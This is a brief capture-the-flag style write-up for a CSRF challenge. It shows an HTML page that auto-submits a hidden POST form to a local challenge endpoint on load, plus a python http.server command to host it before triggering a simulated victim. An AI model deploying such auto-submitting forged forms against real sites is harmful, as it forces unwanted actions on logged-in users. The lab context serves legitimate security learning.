# CSRF 2

#### Have to load a POST into the html, took some internet searching to understand the proper layout of the page and how it works.
```html
HTTP/1.1 200 OK
Content-type: text/html

<html>
	<body onload="document.forms[0].submit()">
		<form method="POST" action="http://challenge.localhost/publish">
			<input type="hidden" name="key" value="value">
			<input type="hidden" name="action_type" value="submit">
		</form>
	</body>
</html>
```

-------------------------------
#### Run the server on either netcat or python as before and then call /challenge/victim:
```python3 -m http.server 1337```
